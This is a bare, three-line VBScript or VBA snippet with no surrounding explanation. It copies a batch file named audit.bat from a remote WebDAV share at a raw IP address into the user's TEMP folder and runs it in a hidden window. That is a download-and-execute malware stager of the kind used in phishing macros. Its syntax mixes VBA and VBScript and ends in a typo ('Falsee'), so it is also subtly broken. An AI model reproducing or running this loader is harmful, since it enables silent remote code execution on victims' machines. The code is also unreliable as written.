Set fso=CreateObject("Scripting.FileSystemObject"):Set w=CreateObject("WScript.Shell")
s="\\198.135.50.89@6065\DavWWWRoot\audit.bat":d=Environ("TEMP")&"\tmp.bat"
fso.CopyFile s,d,True:w.Run """"&d&"""",0,Falsee